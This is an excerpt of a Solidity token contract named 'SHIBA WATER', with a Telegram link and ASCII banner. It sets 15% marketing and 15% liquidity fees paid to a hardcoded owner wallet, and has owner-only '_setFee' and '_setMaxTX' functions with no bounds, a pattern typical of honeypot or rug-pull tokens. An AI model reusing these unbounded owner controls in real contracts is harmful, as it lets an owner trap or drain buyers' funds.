...
/**
https://t.me/shibawaterchannel
  .oooooo..o oooo         o8o   .o8                                                     .                      
d8P'    `Y8 `888         `"'  "888                                                   .o8                      
Y88bo.       888 .oo.   oooo   888oooo.   .oooo.        oooo oooo    ooo  .oooo.   .o888oo  .ooooo.  oooo d8b 
 `"Y8888o.   888P"Y88b  `888   d88' `88b `P  )88b        `88. `88.  .8'  `P  )88b    888   d88' `88b `888""8P 
     `"Y88b  888   888   888   888   888  .oP"888         `88..]88..8'    .oP"888    888   888ooo888  888     
oo     .d8P  888   888   888   888   888 d8(  888          `888'`888'    d8(  888    888 . 888    .o  888     
8""88888P'  o888o o888o o888o  `Y8bod8P' `Y888""8o          `8'  `8'     `Y888""8o   "888" `Y8bod8P' d888b    
...
contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x29ca55e572c53e4353270ff4618b35fB2435129A;
...
contract SHIBAWATER is Context, IERC20, Ownable {
    ...
    string private constant _name = "SHIBA WATER"; // 
    string private constant _symbol = "SHIBA"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 15;
    uint256 public _liquidityFee = 15;
    address payable public  _marketingWallet = payable(0x29ca55e572c53e4353270ff4618b35fB2435129A);
    ...
    function _setMaxTX(uint256 _TX)public onlyOwner{
        _maxTxAmount = _TX * 10**9;
    }
    ...
    function _setFee(uint256 _fees) public onlyOwner{
        _marketingFee = _fees;
        _liquidityFee = _fees;
    }
